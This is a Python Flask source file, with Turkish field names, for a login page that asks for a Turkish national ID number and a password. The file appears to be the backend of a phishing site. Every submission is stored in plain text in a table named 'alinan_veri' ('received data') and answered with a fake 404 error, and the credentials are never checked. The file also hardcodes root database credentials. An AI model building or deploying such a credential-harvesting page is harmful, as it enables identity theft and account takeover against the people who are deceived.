#from multiprocessing import connection
#from sqlite3 import connect
from flask import Flask,render_template,request
from flask_mysqldb import MySQL
from wtforms import Form,StringField,PasswordField,validators
import mysql.connector


class LoginForm(Form):
    tc_no = StringField("",validators=[validators.Length(min = 11,max = 11,message="Lütfen T.C. kimlik numarası giriniz")])
    sifre = PasswordField("",validators=[validators.Length(min = 5,max = 35,message="En az 5 karakter uzunluğunda şifrenizi giriniz.")])

app = Flask(__name__, static_url_path='/static')
app =Flask(__name__)
app.config["MYSQL_HOST"]="db"
app.config["MYSQL_USER"]= "root"
app.config["MYSQL_ROOT_PASSWORD"]="root"
app.config["MYSQL_PASSSWORD"]="root"
app.config["MYSQL_DB"]="project"
app.config["MYSQL_CURSORCLASS"]="DictCursor"

mysql=MySQL(app)

@app.route("/404")
def error():
    return render_template("404.html")

@app.route("/",methods=["GET","POST"])
def login():
    form=LoginForm(request.form)
    if request.method =="POST"and form.validate():
        tc_no=form.tc_no.data
        sifre=form.sifre.data
        cursor =mysql.connection.cursor()
        sorgu="Insert into alinan_veri (tc_no, sifre) values (%s,%s)"
        cursor.execute(sorgu,(tc_no,sifre))
        mysql.connection.commit()
        cursor.close()
        return render_template("/404.html")
    else:
        return render_template("giris1.zul.html",form=form)


if __name__=="__main__":
    app.run(host='0.0.0.0')
